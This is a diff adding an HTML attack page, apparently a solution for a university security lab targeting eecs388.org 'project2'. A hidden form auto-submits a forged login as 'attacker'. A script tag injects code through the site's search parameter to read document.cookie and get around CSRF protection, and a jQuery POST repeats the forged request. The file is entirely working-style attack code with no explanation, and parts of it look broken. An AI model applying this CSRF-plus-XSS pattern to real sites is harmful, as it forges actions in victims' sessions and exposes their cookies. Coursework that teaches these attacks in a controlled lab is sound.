@@ -1,0 +1,25 @@
+<html><body>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+
+	<!--<iframe name="out_frame" id="out_frame">
+		style="width:0;height:0;border:0; border:none;" >
+	</iframe>-->
+
+	<form id="form1" method="POST" action="https://eecs388.org/project2/login?csrfdefense=1&xssdefense=0" style="display:none" ><!--target="out_frame">-->
+		<input type="text" name="username" value="attacker">
+		<input type="text" name="password" value="l33th4x">
+		<input type="hidden" name="csrf_token">
+		<input type="submit" value="click here to submit">
+	</form>
+
+	<script src="https://eecs388.org/project2/search?q=%3Cscript%3E+var+cookies_var%3D%7Bdocument.cookie%7D%3B+%3C%2Fscript%3E">
+		
+		//document.getElementById("form1").getElementsByName("csrf_token")[0].value=cookies_var;
+		document.getElementById("form1").submit();
+		$.ajax({
+			type: 'POST',
+			url: 'https://eecs388.org/project2/login?csrfdefense=1&xssdefense=0',
+			data: $('#form1').serialize(),
+		});
+	</script>
+</body></html>
